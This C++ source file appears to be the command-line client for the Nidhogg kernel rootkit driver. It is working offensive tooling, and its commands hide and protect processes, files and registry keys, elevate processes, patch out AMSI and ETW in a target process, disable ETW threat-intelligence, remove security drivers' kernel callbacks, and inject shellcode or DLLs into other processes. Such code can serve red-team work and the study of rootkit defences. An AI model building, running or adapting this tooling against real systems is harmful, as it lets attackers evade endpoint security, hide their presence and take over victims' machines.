#include <Windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <fstream>
#include "../NidhoggClient/Nidhogg.hpp"

enum class Options {
	Unknown,
	Add, Remove, Clear, Hide, Unhide, Elevate, Signature, Query, Write, Read, Patch, InjectShellcode, InjectDll
};

void PrintUsage() {
	std::cout << "[ * ] Possible usage:" << std::endl;
	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | unhide | elevate | signature | query ] [pid] [signer type] [signature signer]" << std::endl;
	std::cout << "\tNidhoggClient.exe module [hide | unhide] [pid] [module path]" << std::endl;
	std::cout << "\tNidhoggClient.exe thread [add | remove | clear | hide | query ] [tid]" << std::endl;
	std::cout << "\tNidhoggClient.exe file [add | remove | clear | query] [path]" << std::endl;
	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
	std::cout << "\tNidhoggClient.exe patch [pid] [amsi | etw | module name] [function] [patch comma seperated]" << std::endl;
	std::cout << "\tNidhoggClient.exe shinject [apc | thread] [pid] [shellcode file] [parameter 1] [parameter 2] [parameter 3]" << std::endl;
	std::cout << "\tNidhoggClient.exe dllinject [apc | thread] [pid] [dll path]" << std::endl;
	std::cout << "\tNidhoggClient.exe callbacks [query | remove | restore] [callback type] [callback address]" << std::endl;
	std::cout << "\tNidhoggClient.exe etwti [enable | disable]" << std::endl;
}

int Error(int errorCode) {
	switch (errorCode) {
	case NIDHOGG_GENERAL_ERROR:
		std::cout << "[ - ] General error: " << GetLastError() << std::endl;
		break;
	case NIDHOGG_ERROR_CONNECT_DRIVER:
		std::cout << "[ - ] Could not connect to driver: " << GetLastError() << std::endl;
		break;
	case NIDHOGG_ERROR_DEVICECONTROL_DRIVER:
		std::cout << "[ - ] Failed to do operation: " << GetLastError() << std::endl;
		break;
	case NIDHOGG_INVALID_COMMAND:
		std::cerr << "[ - ] Unknown command!" << std::endl;
		PrintUsage();
		break;
	case NIDHOGG_INVALID_OPTION:
		std::cerr << "[ - ] Invalid option!" << std::endl;
		PrintUsage();
		break;
	default:
		std::cout << "[ - ] Unknown error: " << GetLastError() << std::endl;
		break;
	}

	return 1;
}

std::vector<byte> ConvertToVector(std::wstring rawPatch) {
	int b;
	std::vector<byte> vec;
	std::wstringstream rawPatchStream(rawPatch);
	std::wstringstream byteToAdd;

	for (wchar_t i; rawPatchStream >> i; rawPatchStream.good()) {
		byteToAdd << std::hex << i;

		if (rawPatchStream.peek() == L',') {
			rawPatchStream.ignore();
			byteToAdd >> b;
			vec.push_back(b);
			byteToAdd.clear();
		}
	}
	byteToAdd >> b;
	vec.push_back(b);

	return vec;
}

int ConvertToInt(std::wstring rawString) {
	std::wstringstream rawPatchStream(rawString);
	std::wstringstream convertedString;

	for (wchar_t i; rawPatchStream >> i; rawPatchStream.good()) {
		convertedString << std::hex << i;
	}
	
	return _wtoi(convertedString.str().c_str());
}


int wmain(int argc, const wchar_t* argv[]) {
	std::vector<DWORD> pids;
	Options option;
	int success = NIDHOGG_INVALID_COMMAND;

	if (argc < 3)
		return Error(NIDHOGG_INVALID_COMMAND);

	if (_wcsicmp(argv[2], L"add") == 0 || _wcsicmp(argv[2], L"restore") == 0 || _wcsicmp(argv[2], L"enable") == 0)
		option = Options::Add;
	else if (_wcsicmp(argv[2], L"remove") == 0 || _wcsicmp(argv[2], L"disable") == 0)
		option = Options::Remove;
	else if (_wcsicmp(argv[2], L"clear") == 0)
		option = Options::Clear;
	else if (_wcsicmp(argv[2], L"hide") == 0)
		option = Options::Hide;
	else if (_wcsicmp(argv[2], L"unhide") == 0)
		option = Options::Unhide;
	else if (_wcsicmp(argv[2], L"elevate") == 0)
		option = Options::Elevate;
	else if (_wcsicmp(argv[2], L"signature") == 0)
		option = Options::Signature;
	else if (_wcsicmp(argv[2], L"query") == 0)
		option = Options::Query;
	else if (_wcsicmp(argv[1], L"patch") == 0)
		option = Options::Patch;
	else if (_wcsicmp(argv[1], L"write") == 0)
		option = Options::Write;
	else if (_wcsicmp(argv[1], L"read") == 0)
		option = Options::Read;
	else if (_wcsicmp(argv[1], L"shinject") == 0)
		option = Options::InjectShellcode;
	else if (_wcsicmp(argv[1], L"dllinject") == 0)
		option = Options::InjectDll;
	else {
		std::cerr << "[ - ] Unknown option." << std::endl;
		return Error(NIDHOGG_INVALID_OPTION);
	}

	HANDLE hNidhogg = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

	if (hNidhogg == INVALID_HANDLE_VALUE)
		return Error(NIDHOGG_ERROR_CONNECT_DRIVER);

	switch (option) {
		case Options::Add:
		{
			if (_wcsicmp(argv[1], L"process") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggProcessProtect(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggThreadProtect(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"file") == 0) {
				success = Nidhogg::FileUtils::NidhoggFileProtect(hNidhogg, _wcsdup(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"reg") == 0) {
				if (argc == 5) {
					success = Nidhogg::RegistryUtils::NidhoggRegistryProtectValue(hNidhogg, _wcsdup(argv[3]), _wcsdup(argv[4]));
				}
				else {
					success = Nidhogg::RegistryUtils::NidhoggRegistryProtectKey(hNidhogg, _wcsdup(argv[3]));
				}
			}
			else if (_wcsicmp(argv[1], L"etwti") == 0)
				success = Nidhogg::AntiAnalysis::NidhoggEnableDisableEtwTi(hNidhogg, true);
			else if (_wcsicmp(argv[1], L"callbacks") == 0) {
				CallbackType callbackType;
				ULONG64 address = 0;

				if (_wcsicmp(argv[3], L"ObProcessType") == 0)
					callbackType = ObProcessType;
				else if (_wcsicmp(argv[3], L"ObThreadType") == 0)
					callbackType = ObThreadType;
				else if (_wcsicmp(argv[3], L"PsProcessType") == 0)
					callbackType = PsCreateProcessType;
				else if (_wcsicmp(argv[3], L"PsProcessTypeEx") == 0)
					callbackType = PsCreateProcessTypeEx;
				else if (_wcsicmp(argv[3], L"PsCreateThreadType") == 0)
					callbackType = PsCreateThreadType;
				else if (_wcsicmp(argv[3], L"PsCreateThreadTypeNonSystemThread") == 0)
					callbackType = PsCreateThreadTypeNonSystemThread;
				else if (_wcsicmp(argv[3], L"PsImageLoadType") == 0)
					callbackType = PsImageLoadType;
				else {
					success = NIDHOGG_INVALID_OPTION;
					break;
				}
				std::wistringstream iss(argv[4]);
				iss >> address;
				success = Nidhogg::AntiAnalysis::NidhoggRestoreCallback(hNidhogg, address, callbackType);
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Remove:
		{
			if (_wcsicmp(argv[1], L"process") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggProcessUnprotect(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggThreadUnprotect(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"file") == 0) {
				success = Nidhogg::FileUtils::NidhoggFileUnprotect(hNidhogg, _wcsdup(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"reg") == 0) {
				if (argc == 5) {
					success = Nidhogg::RegistryUtils::NidhoggRegistryUnprotectValue(hNidhogg, _wcsdup(argv[3]), _wcsdup(argv[4]));
				}
				else {
					success = Nidhogg::RegistryUtils::NidhoggRegistryUnprotectKey(hNidhogg, _wcsdup(argv[3]));
				}
			}
			else if (_wcsicmp(argv[1], L"etwti") == 0)
				success = Nidhogg::AntiAnalysis::NidhoggEnableDisableEtwTi(hNidhogg, false);
			else if (_wcsicmp(argv[1], L"callbacks") == 0) {
				CallbackType callbackType;
				ULONG64 address = 0;

				if (_wcsicmp(argv[3], L"ObProcessType") == 0)
					callbackType = ObProcessType;
				else if (_wcsicmp(argv[3], L"ObThreadType") == 0)
					callbackType = ObThreadType;
				else if (_wcsicmp(argv[3], L"PsProcessType") == 0)
					callbackType = PsCreateProcessType;
				else if (_wcsicmp(argv[3], L"PsProcessTypeEx") == 0)
					callbackType = PsCreateProcessTypeEx;
				else if (_wcsicmp(argv[3], L"PsCreateThreadType") == 0)
					callbackType = PsCreateThreadType;
				else if (_wcsicmp(argv[3], L"PsCreateThreadTypeNonSystemThread") == 0)
					callbackType = PsCreateThreadTypeNonSystemThread;
				else if (_wcsicmp(argv[3], L"PsImageLoadType") == 0)
					callbackType = PsImageLoadType;
				else {
					success = NIDHOGG_INVALID_OPTION;
					break;
				}
				std::wistringstream iss(argv[4]);
				iss >> address;
				success = Nidhogg::AntiAnalysis::NidhoggDisableCallback(hNidhogg, address, callbackType);
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Clear:
		{
			if (_wcsicmp(argv[1], L"process") == 0)
				success = Nidhogg::ProcessUtils::NidhoggProcessClearAllProtection(hNidhogg);
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggThreadClearAllProtection(hNidhogg);
			}
			else if (_wcsicmp(argv[1], L"file") == 0) {
				success = Nidhogg::FileUtils::NidhoggFileClearAllProtection(hNidhogg);
			}
			else if (_wcsicmp(argv[1], L"reg") == 0) {
				success = Nidhogg::RegistryUtils::NidhoggRegistryClearAll(hNidhogg);
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Hide:
		{
			if (_wcsicmp(argv[1], L"process") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggProcessHide(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggThreadHide(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"module") == 0) {
				if (argc == 5)
					success = Nidhogg::MemoryUtils::NidhoggHideModule(hNidhogg, _wtoi(argv[3]), (wchar_t*)argv[4]);
			}
			else if (_wcsicmp(argv[1], L"reg") == 0) {
				if (argc == 5) {
					success = Nidhogg::RegistryUtils::NidhoggRegistryHideValue(hNidhogg, _wcsdup(argv[3]), _wcsdup(argv[4]));
				}
				else {
					success = Nidhogg::RegistryUtils::NidhoggRegistryHideKey(hNidhogg, _wcsdup(argv[3]));
				}
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Unhide:
		{
			if (_wcsicmp(argv[1], L"process") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggProcessUnhide(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				std::cerr << "[ ! ] TBA" << std::endl;
				success = NIDHOGG_INVALID_OPTION;
			}
			else if (_wcsicmp(argv[1], L"file") == 0) {
				success = NIDHOGG_INVALID_OPTION;
			}
			else if (_wcsicmp(argv[1], L"reg") == 0) {
				if (argc == 5) {
					success = Nidhogg::RegistryUtils::NidhoggRegistryUnhideValue(hNidhogg, _wcsdup(argv[3]), _wcsdup(argv[4]));
				}
				else {
					success = Nidhogg::RegistryUtils::NidhoggRegistryUnhideKey(hNidhogg, _wcsdup(argv[3]));
				}
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Elevate:
		{
			if (_wcsicmp(argv[1], L"process") == 0) {
				success = Nidhogg::ProcessUtils::NidhoggProcessElevate(hNidhogg, _wtoi(argv[3]));
			}
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				std::cerr << "[ ! ] TBA" << std::endl;
				success = NIDHOGG_INVALID_OPTION;
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Signature:
		{
			if (_wcsicmp(argv[1], L"process") == 0 && argc == 6) {
				int signatureType = _wtoi(argv[4]);
				int signatureSigner = _wtoi(argv[5]);
				
				if ((signatureType < PsProtectedTypeNone || signatureType > PsProtectedTypeProtected) ||
					(signatureSigner < PsProtectedSignerNone || signatureSigner > PsProtectedSignerMax)) {
					success = NIDHOGG_INVALID_OPTION;
					break;
				}

				success = Nidhogg::ProcessUtils::NidhoggProcessSetProtection(hNidhogg, _wtoi(argv[3]), signatureType, signatureSigner);
			}
			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Query:
		{
			if (_wcsicmp(argv[1], L"process") == 0) {
				std::vector result = Nidhogg::ProcessUtils::NidhoggQueryProcesses(hNidhogg);

				if (result[0] < 4) {
					success = result[0];
					break;
				}

				std::cout << "[ + ] Protected pids:" << std::endl;

				for (int i = 0; i < result.size(); i++) {
					std::cout << "\t" << result[i] << std::endl;
				}
				break;
			}
			else if (_wcsicmp(argv[1], L"thread") == 0) {
				std::vector result = Nidhogg::ProcessUtils::NidhoggQueryThreads(hNidhogg);

				if (result[0] < 4) {
					success = result[0];
					break;
				}

				std::cout << "[ + ] Protected tids:" << std::endl;

				for (int i = 0; i < result.size(); i++) {
					std::cout << "\t" << result[i] << std::endl;
				}
				break;
			}
			else if (_wcsicmp(argv[1], L"file") == 0) {
				std::vector result = Nidhogg::FileUtils::NidhoggQueryFiles(hNidhogg);

				if (std::isdigit(result[0][0])) {
					success = std::stoi(result[0]);
					break;
				}

				std::cout << "[ + ] Protected files:" << std::endl;

				for (int i = 0; i < result.size(); i++) {
					std::wcout << "\t" << result[i] << std::endl;
				}
				break;
			}
			else if (_wcsicmp(argv[1], L"reg") == 0) {
				if (argc != 4) {
					success = NIDHOGG_INVALID_OPTION;
					break;
				}

				if (_wcsicmp(argv[3], L"value") == 0) {
					auto [protectedValues, protectedKeys] = Nidhogg::RegistryUtils::NidhoggRegistryQueryProtectedValues(hNidhogg);

					if (std::isdigit(protectedValues[0][0])) {
						success = std::stoi(protectedValues[0]);
						break;
					}

					std::cout << "[ + ] Protected registry values:" << std::endl;

					for (int i = 0; i < protectedValues.size(); i++) {
						std::wcout << "\tKeyName: " << protectedKeys[i] << std::endl;
						std::wcout << "\tValueName: " << protectedValues[i] << std::endl;
					}

					auto [hiddenValues, hiddenKeys] = Nidhogg::RegistryUtils::NidhoggRegistryQueryHiddenValues(hNidhogg);

					if (std::isdigit(hiddenValues[0][0])) {
						success = std::stoi(hiddenValues[0]);
						break;
					}

					std::cout << "[ + ] Hidden registry values:" << std::endl;

					for (int i = 0; i < hiddenValues.size(); i++) {
						std::wcout << "\tKeyName: " << hiddenKeys[i] << std::endl;
						std::wcout << "\tValueName: " << hiddenValues[i] << std::endl;
					}
					break;
				}
				else if (_wcsicmp(argv[3], L"key") == 0) {
					std::vector result = Nidhogg::RegistryUtils::NidhoggRegistryQueryProtectedKeys(hNidhogg);

					if (std::isdigit(result[0][0])) {
						success = std::stoi(result[0]);
						break;
					}

					std::cout << "[ + ] Protected registry keys:" << std::endl;

					for (int i = 0; i < result.size(); i++) {
						std::wcout << "\t" << result[i] << std::endl;
					}

					result = Nidhogg::RegistryUtils::NidhoggRegistryQueryHiddenKeys(hNidhogg);

					if (std::isdigit(result[0][0])) {
						success = std::stoi(result[0]);
						break;
					}

					std::cout << "[ + ] Hidden registry keys:" << std::endl;

					for (int i = 0; i < result.size(); i++) {
						std::wcout << "\t" << result[i] << std::endl;
					}
					break;
				}
				else {
					success = NIDHOGG_INVALID_OPTION;
				}
			}

			else if (_wcsicmp(argv[1], L"callbacks") == 0) {
				if (argc != 4) {
					success = NIDHOGG_INVALID_OPTION;
					break;
				}
				CallbackType callbackType;

				if (_wcsicmp(argv[3], L"ObProcessType") == 0)
					callbackType = ObProcessType;
				else if (_wcsicmp(argv[3], L"ObThreadType") == 0)
					callbackType = ObThreadType;
				else if (_wcsicmp(argv[3], L"PsProcessType") == 0)
					callbackType = PsCreateProcessType;
				else if (_wcsicmp(argv[3], L"PsProcessTypeEx") == 0)
					callbackType = PsCreateProcessTypeEx;
				else if (_wcsicmp(argv[3], L"PsCreateThreadType") == 0)
					callbackType = PsCreateThreadType;
				else if (_wcsicmp(argv[3], L"PsCreateThreadTypeNonSystemThread") == 0)
					callbackType = PsCreateThreadTypeNonSystemThread;
				else if (_wcsicmp(argv[3], L"PsImageLoadType") == 0)
					callbackType = PsImageLoadType;
				else if (_wcsicmp(argv[3], L"CmRegistryType") == 0)
					callbackType = CmRegistryType;
				else {
					success = NIDHOGG_INVALID_OPTION;
					break;
				}

				if (callbackType == ObProcessType || callbackType == ObThreadType) {
					ObCallbacksList callbacks{};
					ObCallback currentCallback;

					callbacks = Nidhogg::AntiAnalysis::NidhoggListObCallbacks(hNidhogg, callbackType, &success);

					if (success == NIDHOGG_SUCCESS) {
						for (int i = 0; i < callbacks.NumberOfCallbacks; i++) {
							currentCallback = callbacks.Callbacks[i];

							if (currentCallback.DriverName)
								std::cout << "Driver Name: " << currentCallback.DriverName << std::endl;
							else
								std::cout << "Driver Name: Unknown" << std::endl;
							std::cout << "\tPre operation callback: " << std::hex << currentCallback.PreOperation << std::endl;
							std::cout << "\tPost operation callback: " << std::hex << currentCallback.PostOperation << std::endl;
						}

						free(callbacks.Callbacks);
					}
				}
				else if (callbackType == CmRegistryType) {
					CmCallbacksList callbacks{};
					CmCallback currentCallback;

					callbacks = Nidhogg::AntiAnalysis::NidhoggListRegistryCallbacks(hNidhogg, &success);

					if (success == NIDHOGG_SUCCESS) {
						for (int i = 0; i < callbacks.NumberOfCallbacks; i++) {
							currentCallback = callbacks.Callbacks[i];

							if (currentCallback.DriverName)
								std::cout << "Driver Name: " << currentCallback.DriverName << std::endl;
							else
								std::cout << "Driver Name: Unknown" << std::endl;
							std::cout << "\tCallback: " << std::hex << currentCallback.CallbackAddress << std::endl;
							std::cout << "\tContext: " << std::hex << currentCallback.Context << std::endl;
						}

						free(callbacks.Callbacks);
					}
				}
				else {
					PsRoutinesList routines{};
					PsRoutine currentRoutine;
					routines = Nidhogg::AntiAnalysis::NidhoggListPsRoutines(hNidhogg, callbackType, &success);

					if (success == NIDHOGG_SUCCESS) {
						for (int i = 0; i < routines.NumberOfRoutines; i++) {
							currentRoutine = routines.Routines[i];

							if (currentRoutine.DriverName)
								std::cout << "Driver Name: " << currentRoutine.DriverName << std::endl;
							else
								std::cout << "Driver Name: Unknown" << std::endl;
							std::cout << "\tCallback: " << std::hex << currentRoutine.CallbackAddress << std::endl;
						}
					}
				}
			}

			else {
				success = NIDHOGG_INVALID_OPTION;
			}
			break;
		}

		case Options::Patch:
		{
			if (argc != 6 && argc != 4) {
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			int pid = _wtoi(argv[2]);

			if (pid == 0) {
				std::cerr << "[ - ] Invalid PID." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			if (_wcsicmp(argv[3], L"amsi") == 0) {
				success = Nidhogg::MemoryUtils::NidhoggAmsiBypass(hNidhogg, pid);
			}
			else if (_wcsicmp(argv[3], L"etw") == 0) {
				success = Nidhogg::MemoryUtils::NidhoggETWBypass(hNidhogg, pid);
			}
			else {
				std::wstring wFunctionName(argv[4]);
				std::string functionName(wFunctionName.begin(), wFunctionName.end());
				std::vector<byte> patch = ConvertToVector(std::wstring(argv[5]));

				success = Nidhogg::MemoryUtils::NidhoggPatchModule(hNidhogg, pid, (wchar_t*)argv[3], (char*)functionName.c_str(), patch);
			}
			break;
		}

		case Options::Write:
		case Options::Read:
		{
			MODE mode;

			if (argc != 6) {
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			if (_wcsicmp(argv[5], L"kernel") == 0)
				mode = MODE::KernelMode;
			else if (_wcsicmp(argv[5], L"user") == 0)
				mode = MODE::UserMode;
			else {
				std::cerr << "[ - ] Invalid mode." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			int pid = _wtoi(argv[2]);

			if (pid == 0) {
				std::cerr << "[ - ] Invalid PID." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			int size = _wtoi(argv[4]);

			if (size == 0) {
				std::cerr << "[ - ] Invalid size." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			int remoteAddress = ConvertToInt(argv[3]);

			if (remoteAddress == 0) {
				std::cerr << "[ - ] Invalid address." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}
			break;
		}

		case Options::InjectShellcode:
		{
			InjectionType injectionType;
			PVOID parameter1 = NULL;
			PVOID parameter2 = NULL;
			PVOID parameter3 = NULL;

			int pid = _wtoi(argv[3]);

			if (pid == 0) {
				std::cerr << "[ - ] Invalid PID." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			if (_wcsicmp(argv[2], L"thread") == 0)
				injectionType = NtCreateThreadExInjection;

			else if (_wcsicmp(argv[2], L"apc") == 0) {
				injectionType = APCInjection;

				if (argc >= 5) {
					parameter1 = (PVOID)argv[5];

					if (argc >= 6) {
						parameter2 = (PVOID)argv[6];

						if (argc == 7) {
							parameter3 = (PVOID)argv[7];
						}
					}
				}
			}
			else {
				std::cerr << "[ - ] Invalid injection type." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			std::ifstream input(argv[4], std::ios::binary);

			if (input.bad()) {
				std::cerr << "[ - ] Invalid shellcode file." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}
			std::vector<unsigned char> shellcode(std::istreambuf_iterator<char>(input), {});

			success = Nidhogg::MemoryUtils::NidhoggInjectShellcode(hNidhogg, pid, shellcode.data(), shellcode.size(), parameter1, parameter2, parameter3, injectionType);
			break;
		}

		case Options::InjectDll:
		{
			InjectionType injectionType;

			if (_wcsicmp(argv[2], L"thread") == 0)
				injectionType = NtCreateThreadExInjection;
			else if (_wcsicmp(argv[2], L"apc") == 0)
				injectionType = APCInjection;
			else {
				std::cerr << "[ - ] Invalid injection type." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			int pid = _wtoi(argv[3]);

			if (pid == 0) {
				std::cerr << "[ - ] Invalid PID." << std::endl;
				success = NIDHOGG_INVALID_OPTION;
				break;
			}

			std::wstring temp = std::wstring(argv[4]);
			std::string dllPath = std::string(temp.begin(), temp.end());

			success = Nidhogg::MemoryUtils::NidhoggInjectDll(hNidhogg, pid, dllPath.c_str(), injectionType);
			break;
		}
	}

	CloseHandle(hNidhogg);

	if (success != NIDHOGG_SUCCESS)
		return Error(success);

	std::cout << "[ + ] Operation succeeded." << std::endl;
	return success;
}
